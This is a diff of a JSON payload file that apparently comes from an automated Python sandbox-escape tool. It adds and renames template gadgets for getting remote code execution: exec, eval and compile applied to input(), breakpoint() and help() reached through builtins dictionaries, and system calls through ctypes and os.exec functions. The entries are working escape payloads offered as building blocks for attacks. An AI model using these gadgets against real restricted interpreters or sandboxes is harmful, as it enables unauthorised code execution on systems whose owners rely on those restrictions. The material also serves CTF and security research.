@@ -14,11 +14,29 @@
         ["breakpoint()", "breakpoint"],
         ["exec(input())", "exec,input"],
         ["eval(input())", "eval,input"],
-        ["compile(input(), '<string>', 'exec')", "compile,input"],
+        ["compile(input(), RANDOMSTRING, 'exec')", "compile,input"],
+        ["compile(input(), RANDOMSTRING, 'eval')", "compile,input"],
+        ["compile(input(), RANDOMSTRING, 'single')", "compile,input"],
         ["from os import system as __getattr__;from __main__ import sh", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
         ["from os import popen as __getattr__;from __main__ import sh", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
         ["from uuid import _get_command_stdout as __getattr__;from __main__ import sh", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
         ["import pdb;pdb.set_trace()", "BUILTINS_SET_CHANGED|BUILTINS_SET"]
+    ],
+    "builtins2RCE":[
+        ["BUILTINS_SET['help']()", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.help()", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['breakpoint']()", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.breakpoint()", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['exec'](BUILTINS_SET['input']())", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.exec(MODULE_BUILTINS.input())", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['eval'](BUILTINS_SET['input']())", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.eval(MODULE_BUILTINS.input())", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['compile'](BUILTINS_SET['input'](), RANDOMSTRING, 'exec')", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(), RANDOMSTRING, 'exec')", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['compile'](BUILTINS_SET['input'](), RANDOMSTRING, 'eval')", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(), RANDOMSTRING, 'eval')", "MODULE_BUILTINS"],
+        ["BUILTINS_SET['compile'](BUILTINS_SET['input'](), RANDOMSTRING,'single')", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.compile(MODULE_BUILTINS.input(), RANDOMSTRING,'single')", "MODULE_BUILTINS"]
     ],
     "get_user_defined_function":[
         ["def RANDOMVARNAME():RANDOMSTRING", ""]
@@ -123,7 +141,7 @@
         ["BUILTINOBJ.__class__.__mro__[-1]", ""],
         ["BUILTINOBJ.__class__.__mro__[1]", ""]
     ],
-    "RCE_system_functions":[
+    "import2RCE":[
         ["ctypes.CDLL(None).system(CMD.encode())", "ctypes"],
         ["os.execl(CMD_FILE, UNFOLD_CMD_ARGS)", "os"],
         ["os.execle(CMD_FILE, UNFOLD_CMD_ARGS)", "os"],
